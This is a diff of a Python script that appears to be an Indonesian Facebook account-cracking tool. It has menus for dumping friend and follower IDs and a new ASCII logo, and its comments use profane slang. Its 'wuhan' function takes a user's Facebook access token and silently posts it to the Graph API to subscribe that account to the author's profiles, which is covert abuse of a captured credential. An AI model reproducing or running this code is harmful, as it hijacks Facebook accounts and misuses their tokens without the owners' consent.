@@ -89,11 +89,15 @@ def tod():
         time.sleep(1)
 
 # LO KONTOL
-# LO KONTOL
-logo = ''' \033[0;96m __|  _ \    \     __|  |  /    __| _ )   _  ) 
- \033[0;96m (       /   _ \   (     . <     _|  _ \     /  ® \033[0m|| Created By YayanXD
- \033[0;96m  \___| _|_\ _/  _\ \___| _|\_\   _|  ___/   ___|      \033[0m|| Github.com/Yayan-XD
-
+logo = ''' \033[0;96m █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+ \033[0;96m █ █████████                               █
+ \033[0;96m █▄█████▄█
+ \033[0;96m █ █▼▼▼▼▼
+\033[0;96m  █ █ 
+\033[0;96m  █ █▲▲▲▲▲
+\033[0;96m  █ █████████ 
+\033[0;96m  █  ██ ██ 
+\033[0;96m  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
 
 lo_ngentod = '1714009362122228'
 # crack selesai
@@ -145,13 +149,14 @@ def moch_yayan():
     os.system('clear')
     print logo
     IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
+    print '___________________________________________________________\n';time.sleep(0.03)
     print ' (\033[0;96m•\033[0m) NAMA KAMU : %s'%(nama);time.sleep(0.03)
     print ' (\033[0;96m•\033[0m) IP KAMU   : %s'%(IP)
-    print '_______________________________________________________\n';time.sleep(0.03)
+    print '___________________________________________________________\n';time.sleep(0.03)
     print ' %s[•]%s Author  : Aang Ardiansyah-XD'%(O,N);time.sleep(0.03)
     print ' %s[•]%s Github  : Github.com/AngCyber/Kiya'%(O,N);time.sleep(0.03)
     print ' %s[•]%s Contact : +6289524163441'%(O,N); time.sleep(0.03)
-    print '_______________________________________________________\n';time.sleep(0.03)
+    print '___________________________________________________________\n';time.sleep(0.03)
     print ' [%s01%s]. Dump id dari teman'%(O,N);time.sleep(0.03)
     print ' [%s02%s]. Dump id dari teman publik'%(O,N);time.sleep(0.03)
     print ' [%s03%s]. Dump id dari total followers'%(O,N);time.sleep(0.03)
@@ -217,7 +222,6 @@ def moch_yayan():
 def wuhan(kontol):
     try:
         kentod = kontol
-        
         requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
